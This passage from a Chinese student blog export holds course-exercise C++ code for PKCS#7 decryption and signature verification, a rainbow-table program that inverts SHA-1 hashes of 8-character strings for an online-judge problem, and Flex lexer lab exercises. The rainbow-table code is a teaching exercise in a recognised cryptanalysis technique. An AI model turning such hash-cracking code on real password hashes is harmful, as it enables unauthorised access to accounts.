class="line">&#125;</span><br><span class="line"><span class="function">EVP_PKEY *<span class="title">getpkey</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *private_key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BIO *bio_pkey = <span class="built_in">BIO_new_mem_buf</span>((<span class="keyword">char</span> *)private_key, <span class="built_in">strlen</span>(private_key));</span><br><span class="line">	<span class="keyword">if</span> (bio_pkey == <span class="literal">NULL</span>)</span><br><span class="line"> 		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"> 	<span class="keyword">return</span>  <span class="built_in">PEM_read_bio_PrivateKey</span>(bio_pkey, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_pkcs7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BIO *bio_out,*mem;</span><br><span class="line">	PKCS7 *p7;</span><br><span class="line">	X509 *cert;</span><br><span class="line">  	X509_STORE *ca;</span><br><span class="line">	<span class="keyword">size_t</span> len;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">70</span>],ans[<span class="number">5000</span>];</span><br><span class="line">	string str=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> *out;</span><br><span class="line">	<span class="keyword">int</span> i,flags,num_signer;</span><br><span class="line">	EVP_PKEY* pKey = <span class="built_in">getpkey</span>(pkeyB);</span><br><span class="line"> 	ca=<span class="built_in">X509_STORE_new</span>();</span><br><span class="line">  	<span class="built_in">X509_STORE_add_cert</span>(ca,<span class="built_in">getX509</span>(cacert));</span><br><span class="line">  </span><br><span class="line"> 	<span class="keyword">while</span>(<span class="built_in">fgets</span>(buf,<span class="built_in"><span class="keyword">sizeof</span></span>(buf),stdin))&#123;</span><br><span class="line"> 		str+=buf;	</span><br><span class="line">	&#125;<span class="comment">//输入的PKCS#7字符串</span></span><br><span class="line"> 	str+=<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"> 	<span class="keyword">const</span> <span class="keyword">char</span> *s=str.<span class="built_in">c_str</span>();</span><br><span class="line">	mem=<span class="built_in">BIO_new_mem_buf</span>(s,<span class="built_in">strlen</span>(s));</span><br><span class="line">	p7 = <span class="built_in">PKCS7_new</span>();</span><br><span class="line">	p7= <span class="built_in">PEM_read_bio_PKCS7</span>(mem, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(p7==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ERROR\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	bio_out=<span class="built_in">PKCS7_dataDecode</span>(p7,pKey,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	len=<span class="built_in">BIO_read</span>(bio_out,ans,<span class="built_in"><span class="keyword">sizeof</span></span>(ans));</span><br><span class="line">	<span class="keyword">if</span>(len==<span class="number">-2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ERROR\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">STACK_OF</span>(PKCS7_SIGNER_INFO) *so=<span class="built_in">PKCS7_get_signer_info</span>(p7);</span><br><span class="line">	<span class="keyword">if</span>(so==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ERROR\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	num_signer=<span class="built_in">sk_PKCS7_SIGNER_INFO_num</span>(so);</span><br><span class="line">	PKCS7_SIGNER_INFO *si;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;num_signer;i++)&#123;</span><br><span class="line">		si=<span class="built_in">sk_PKCS7_SIGNER_INFO_value</span>(so,i);</span><br><span class="line">		X509_STORE_CTX* ct=<span class="built_in">X509_STORE_CTX_new</span>();</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">PKCS7_dataVerify</span>(ca,ct,bio_out,p7,si)!=<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ERROR\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,ans[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">OpenSSL_add_all_algorithms</span>();</span><br><span class="line">	<span class="built_in">gen_pkcs7</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="彩虹表"><a href="#彩虹表" class="headerlink" title="彩虹表"></a>彩虹表</h4><p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/XX">oj | 彩虹表</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> GCC optimize(<span class="meta-string">&quot;O3&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> SHA1_tmp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ModN 2176782336</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHA1_ROTL(a, b)                                                        \</span></span><br><span class="line">  (SHA1_tmp = (a),                                                             \</span><br><span class="line">   ((SHA1_tmp &gt;&gt; (<span class="number">32</span> - b)) &amp; (<span class="number">0x7fffffff</span> &gt;&gt; (<span class="number">31</span> - b))) | (SHA1_tmp &lt;&lt; b))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHA1_F(B, C, D, t)                                                     \</span></span><br><span class="line">  ((t &lt; <span class="number">40</span>) ? ((t &lt; <span class="number">20</span>) ? ((B &amp; C) | ((~B) &amp; D)) : (B ^ C ^ D))                \</span><br><span class="line">            : ((t &lt; <span class="number">60</span>) ? ((B &amp; C) | (B &amp; D) | (C &amp; D)) : (B ^ C ^ D)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Bstr[<span class="number">10000</span>][<span class="number">9</span>] = &#123;<span class="number">0</span>&#125;, Estr[<span class="number">10000</span>][<span class="number">9</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m;</span><br><span class="line"><span class="comment">// mp用来保存链尾的字符串与链下标的对应关系</span></span><br><span class="line">map&lt;string, <span class="keyword">int</span>&gt; mp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">getStr</span><span class="params">(<span class="keyword">unsigned</span> n, <span class="keyword">char</span> str[<span class="number">8</span>])</span> </span>&#123;</span><br><span class="line">  str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>, str[<span class="number">1</span>] = <span class="string">&#x27;0&#x27;</span>, str[<span class="number">2</span>] = <span class="string">&#x27;0&#x27;</span>, str[<span class="number">3</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">  str[<span class="number">4</span>] = <span class="string">&#x27;0&#x27;</span>, str[<span class="number">5</span>] = <span class="string">&#x27;0&#x27;</span>, str[<span class="number">6</span>] = <span class="string">&#x27;0&#x27;</span>, str[<span class="number">7</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> tmp = n % <span class="number">36</span>;</span><br><span class="line">    <span class="keyword">if</span> (tmp &lt; <span class="number">10</span>)</span><br><span class="line">      str[i++] = tmp + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      str[i++] = tmp - <span class="number">10</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    n = n / <span class="number">36</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">R</span><span class="params">(<span class="keyword">unsigned</span> sha1[<span class="number">5</span>], <span class="keyword">char</span> str[<span class="number">8</span>], <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">getStr</span>((sha1[<span class="number">0</span>] + sha1[<span class="number">1</span>] * i) % ModN, str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">SHA1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">int</span> length, <span class="keyword">unsigned</span> sha1[<span class="number">5</span>])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> *pp, *ppend;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l, i, K[<span class="number">80</span>], W[<span class="number">80</span>], TEMP, A, B, C, D, E, H0, H1, H2, H3, H4;</span><br><span class="line">  H0 = <span class="number">0x67452301</span>, H1 = <span class="number">0xEFCDAB89</span>, H2 = <span class="number">0x98BADCFE</span>, H3 = <span class="number">0x10325476</span>,</span><br><span class="line">  H4 = <span class="number">0xC3D2E1F0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">20</span>; K[i++] = <span class="number">0x5A827999</span>)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">20</span>; i &lt; <span class="number">40</span>; K[i++] = <span class="number">0x6ED9EBA1</span>)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">40</span>; i &lt; <span class="number">60</span>; K[i++] = <span class="number">0x8F1BBCDC</span>)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">60</span>; i &lt; <span class="number">80</span>; K[i++] = <span class="number">0xCA62C1D6</span>)</span><br><span class="line">    ;</span><br><span class="line">  l = length + ((length % <span class="number">64</span> &gt; <span class="number">56</span>) ? (<span class="number">128</span> - length % <span class="number">64</span>) : (<span class="number">64</span> - length % <span class="number">64</span>));</span><br><span class="line">  <span class="keyword">if</span> (!(pp = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)l)))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; pp[i + <span class="number">3</span> - <span class="number">2</span> * (i % <span class="number">4</span>)] = str[i], i++)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">for</span> (pp[i + <span class="number">3</span> - <span class="number">2</span> * (i % <span class="number">4</span>)] = <span class="number">128</span>, i++; i &lt; l;</span><br><span class="line">       pp[i + <span class="number">3</span> - <span class="number">2</span> * (i % <span class="number">4</span>)] = <span class="number">0</span>, i++)</span><br><span class="line">    ;</span><br><span class="line">  *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(pp + l - <span class="number">4</span>)) = length &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(pp + l - <span class="number">8</span>)) = length &gt;&gt; <span class="number">29</span>;</span><br><span class="line">  <span class="keyword">for</span> (ppend = pp + l; pp &lt; ppend; pp += <span class="number">64</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; W[i] = ((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)pp)[i], i++)</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">16</span>; i &lt; <span class="number">80</span>;</span><br><span class="line">         W[i] = <span class="built_in">SHA1_ROTL</span>((W[i - <span class="number">3</span>] ^ W[i - <span class="number">8</span>] ^ W[i - <span class="number">14</span>] ^ W[i - <span class="number">16</span>]), <span class="number">1</span>),</span><br><span class="line">        i++)</span><br><span class="line">      ;</span><br><span class="line">    A = H0, B = H1, C = H2, D = H3, E = H4;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">80</span>; i++) &#123;</span><br><span class="line">      TEMP = <span class="built_in">SHA1_ROTL</span>(A, <span class="number">5</span>) + <span class="built_in">SHA1_F</span>(B, C, D, i) + E + W[i] + K[i];</span><br><span class="line">      E = D, D = C, C = <span class="built_in">SHA1_ROTL</span>(B, <span class="number">30</span>), B = A, A = TEMP;</span><br><span class="line">    &#125;</span><br><span class="line">    H0 += A, H1 += B, H2 += C, H3 += D, H4 += E;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(pp - l);</span><br><span class="line">  sha1[<span class="number">0</span>] = H0, sha1[<span class="number">1</span>] = H1, sha1[<span class="number">2</span>] = H2, sha1[<span class="number">3</span>] = H3, sha1[<span class="number">4</span>] = H4;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span> str[<span class="number">9</span>], <span class="keyword">unsigned</span> sha1[<span class="number">5</span>], <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> temporarySHA1[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">char</span> temporaryString[<span class="number">9</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(temporaryString, Bstr[index]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10000</span>; j++) &#123;</span><br><span class="line">    <span class="built_in">SHA1</span>(temporaryString, <span class="number">8</span>, temporarySHA1); <span class="comment">// 得到sha1</span></span><br><span class="line">    <span class="keyword">for</span> (l = <span class="number">0</span>; l &lt; <span class="number">5</span>; l++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (temporarySHA1[l] != sha1[l]) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (l == <span class="number">5</span>) &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(str, temporaryString);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">R</span>(temporarySHA1, temporaryString, j % <span class="number">100</span> + <span class="number">1</span>); <span class="comment">// 得到str</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> sha1[<span class="number">5</span>], temporarySHA1[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">9</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>, Bstr[i], Estr[i]);</span><br><span class="line">    string begin = <span class="built_in">string</span>(Bstr[i]);</span><br><span class="line">    string end = <span class="built_in">string</span>(Estr[i]);</span><br><span class="line">    mp.<span class="built_in">insert</span>(pair&lt;string, <span class="keyword">int</span>&gt;(end, i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%8x%8x%8x%8x%8x&quot;</span>, &amp;(sha1[<span class="number">0</span>]), &amp;(sha1[<span class="number">1</span>]), &amp;(sha1[<span class="number">2</span>]), &amp;(sha1[<span class="number">3</span>]),</span><br><span class="line">        &amp;(sha1[<span class="number">4</span>]));</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++)</span><br><span class="line">      temporarySHA1[j] = sha1[j];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10000</span>; j++) &#123;</span><br><span class="line">      <span class="built_in">R</span>(temporarySHA1, str, (i + j) % <span class="number">100</span> + <span class="number">1</span>); <span class="comment">// 得到str</span></span><br><span class="line">      <span class="keyword">if</span> (mp.<span class="built_in">find</span>(str) != mp.<span class="built_in">end</span>()) &#123;</span><br><span class="line">        <span class="keyword">int</span> index = mp[str];</span><br><span class="line">        flag = <span class="built_in">find</span>(str, sha1, index);</span><br><span class="line">        <span class="keyword">if</span> (flag)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">SHA1</span>(str, <span class="number">8</span>, temporarySHA1); <span class="comment">// 得到sha1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (flag)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;None\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
]]></content>
      <categories>
        <category>课程设计</category>
      </categories>
      <tags>
        <tag>课程设计</tag>
      </tags>
  </entry>
  <entry>
    <title>算法记录:树状数组</title>
    <url>/2021/10/28/%E7%AE%97%E6%B3%95%E8%AE%B0%E5%BD%95-%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>编译原理实验:Week1</title>
    <url>/2021/10/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C-Week1/</url>
    <content><![CDATA[<hr>
<div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>这里贴出来对第一周实验的代码记录，仅做个人记录所用。</p>
</div>
<hr>
<h3 id="第1关：Flex首次尝试"><a href="#第1关：Flex首次尝试" class="headerlink" title="第1关：Flex首次尝试"></a>第1关：Flex首次尝试</h3><p>记录输入的字符串的行数和字符的个数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> num_lines=<span class="number">0</span>,num_chars=<span class="number">0</span>;</span><br><span class="line">%%</span><br><span class="line">\n ++num_lines;</span><br><span class="line">.  ++num_chars;</span><br><span class="line">%%</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">yylex</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Lines=%d,Chars=%d\n&quot;</span>,num_lines,num_chars);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="第2关：简单Pascal-like-toy语言识别补全"><a href="#第2关：简单Pascal-like-toy语言识别补全" class="headerlink" title="第2关：简单Pascal-like toy语言识别补全"></a>第2关：简单Pascal-like toy语言识别补全</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">  <span class="comment">//Add a head file here</span></span><br><span class="line">%&#125;</span><br><span class="line">DIGIT [<span class="number">0</span><span class="number">-9</span>]</span><br><span class="line">ID [a-z][a-z0<span class="number">-9</span>]</span><br><span class="line">%%</span><br><span class="line">&#123;DIGIT&#125;+                 &#123;<span class="built_in">printf</span>( <span class="string">&quot;An integer: %s (%d)\n&quot;</span>, yytext,<span class="built_in">atoi</span>( yytext ) );&#125;</span><br><span class="line">&#123;DIGIT&#125;+<span class="string">&quot;.&quot;</span>&#123;DIGIT&#125;*      &#123;<span class="built_in">printf</span>( <span class="string">&quot;A float: %s (%g)\n&quot;</span>, yytext,<span class="built_in">atof</span>( yytext ) );&#125;<span class="comment">//动作</span></span><br><span class="line"><span class="keyword">if</span>|then|begin|end|procedure|function &#123;<span class="built_in">printf</span>( <span class="string">&quot;A keyword: %s\n&quot;</span>, yytext );&#125;<span class="comment">//关键字</span></span><br><span class="line">[a-z]+[a-z0<span class="number">-9</span>]* <span class="built_in">printf</span>( <span class="string">&quot;An identifier: %s\n&quot;</span>, yytext );</span><br><span class="line"><span class="string">&quot;+&quot;</span>|<span class="string">&quot;-&quot;</span>|<span class="string">&quot;*&quot;</span>|<span class="string">&quot;/&quot;</span>         <span class="built_in">printf</span>( <span class="string">&quot;An operator: %s\n&quot;</span>, yytext );</span><br><span class="line"><span class="string">&quot;&#123;&quot;</span>[^&#125;\n]*<span class="string">&quot;&#125;&quot;</span> 	<span class="comment">/* eat up one-line comments */</span></span><br><span class="line">[ \t\n]+ 		<span class="comment">/* eat up whitespace */</span></span><br><span class="line">.       <span class="built_in">printf</span>( <span class="string">&quot;Unrecognized character: %s\n&quot;</span>, yytext );</span><br><span class="line">%%</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( argc, argv )</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> argc</span>;</span><br><span class="line"><span class="keyword">char</span> **argv;</span><br><span class="line">&#123;</span><br><span class="line">++argv, --argc; <span class="comment">/* skip over program name */</span></span><br><span class="line"><span class="keyword">if</span> ( argc &gt; <span class="number">0</span> )</span><br><span class="line">        yyin = <span class="built_in">fopen</span>( argv[<span class="number">0</span>], <span class="string">&quot;r&quot;</span> );</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        yyin = stdin;</span><br><span class="line">        <span class="built_in">yylex</span>();</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>
<h3 id="第3关：Flex规则匹配顺序"><a href="#第3关：Flex规则匹配顺序" class="headerlink" title="第3关：Flex规则匹配顺序"></a>第3关：Flex规则匹配顺序</h3><p>这一题是自己手动判断并输入自己判断得到的序列。也可以利用Flex进行编译运行代码获得答案，如果后续知道如何实现再添加。</p>
<p>待判断的代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">%%</span><br><span class="line">a*b             &#123;<span class="built_in">printf</span>(<span class="string">&quot;1&quot;</span>);&#125;</span><br><span class="line">ca              &#123;<span class="built_in">printf</span>(<span class="string">&quot;2&quot;</span>);&#125;</span><br><span class="line">a*ca*           &#123;<span class="built_in">printf</span>(<span class="string">&quot;3&quot;</span>);&#125;</span><br><span class="line">%%</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">yylex</span>();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入序列：abcaacacaaabbaaabcaaca </span><br><span class="line">答案：<span class="number">132311132</span></span><br></pre></td></tr></table></figure>
<h3 id="第4关：Flex词法规则补全（PL语言）"><a href="#第4关：Flex词法规则补全（PL语言）" class="headerlink" title="第4关：Flex词法规则补全（PL语言）"></a>第4关：Flex词法规则补全（PL语言）</h3><p>这一题好难！呜呜呜。。。</p>
<p>需要注意标识符和字符常量的顺序，另外，关于大于小于那一块的判断，可以利用他们之间的顺序来进行放置（这样就不用判断先‘&gt;’再判断‘非=’了捏）。</p>
<p>还有不要忘了ERROR呀！</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* PL词法分析器 */</span></span><br><span class="line"><span class="comment">/* 功能：能够识别出PL支持的所有单词符号并给出种别值 */</span></span><br><span class="line"><span class="comment">/* 说明：在下面的begin和end之间添加代码，已经实现了标识符和整常量的识别，你需要完成剩下的部分，加油吧！ */</span></span><br><span class="line"><span class="comment">/* 提示：因为是顺序匹配，即从上至下依次匹配规则，所以需要合理安排顺序～ */</span></span><br><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">%&#125; <span class="comment">/*** begin ****/</span></span><br><span class="line"></span><br><span class="line">INTCON	     [\-]?[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]*|<span class="number">0</span></span><br><span class="line">CHARCON      \&#x27;[^&#x27;]*\&#x27;</span><br><span class="line">PLUS         <span class="string">&quot;+&quot;</span></span><br><span class="line">MINUS        <span class="string">&quot;-&quot;</span></span><br><span class="line">TIMES        <span class="string">&quot;*&quot;</span></span><br><span class="line">DIVSYM       <span class="string">&quot;/&quot;</span></span><br><span class="line">EQL          =</span><br><span class="line">NEQ          &lt;&gt;</span><br><span class="line">LEQ          &lt;=</span><br><span class="line">LSS          &lt;</span><br><span class="line">GEQ          &gt;=</span><br><span class="line">GTR          &gt;</span><br><span class="line">OFSYM        of</span><br><span class="line">ARRAYSYM     array</span><br><span class="line">PROGRAMSYM   program</span><br><span class="line">MODSYM       mod</span><br><span class="line">ANDSYM       <span class="keyword">and</span></span><br><span class="line">ORSYM        <span class="keyword">or</span></span><br><span class="line">NOTSYM       <span class="keyword">not</span></span><br><span class="line">LBRACK       \[</span><br><span class="line">RBRACK       \]</span><br><span class="line">LPAREN       \(</span><br><span class="line">RPAREN       \)</span><br><span class="line">COMMA        ,</span><br><span class="line">SEMICOLON    ;</span><br><span class="line">PERIOD       \.</span><br><span class="line">BECOME       :=</span><br><span class="line">COLON        :</span><br><span class="line">BEGINSYM     begin</span><br><span class="line">ENDSYM       end</span><br><span class="line">IFSYM        <span class="keyword">if</span></span><br><span class="line">THENSYM      then</span><br><span class="line">ELSESYM      <span class="keyword">else</span></span><br><span class="line">WHILESYM     <span class="keyword">while</span></span><br><span class="line">DOSYM        <span class="keyword">do</span></span><br><span class="line">CALLSYM      call</span><br><span class="line">CONSTSYM     <span class="keyword">const</span></span><br><span class="line">TYPESYM      type</span><br><span class="line">VARSYM       var</span><br><span class="line">PROCSYM      procedure</span><br><span class="line">IDENT        [A-Za-z][A-Za-z0<span class="number">-9</span>]*</span><br><span class="line">ERROR        [~!@#$%^&amp;_\\]</span><br><span class="line"></span><br><span class="line">%%  </span><br><span class="line"></span><br><span class="line">&#123;INTCON&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: INTCON\n&quot;</span>, yytext);&#125;</span><br><span class="line">&#123;PLUS&#125;           &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: PLUS\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;MINUS&#125;          &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: MINUS\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;TIMES&#125;          &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: TIMES\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;DIVSYM&#125;         &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: DIVSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;EQL&#125;            &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: EQL\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;NEQ&#125;            &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: NEQ\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;LSS&#125;            &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: LSS\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;LEQ&#125;            &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: LEQ\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;GTR&#125;            &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: GTR\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;GEQ&#125;			&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: GEQ\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;OFSYM&#125;		    &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: OFSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ARRAYSYM&#125;		&#123;<span class="built_in">printf</span>(<span 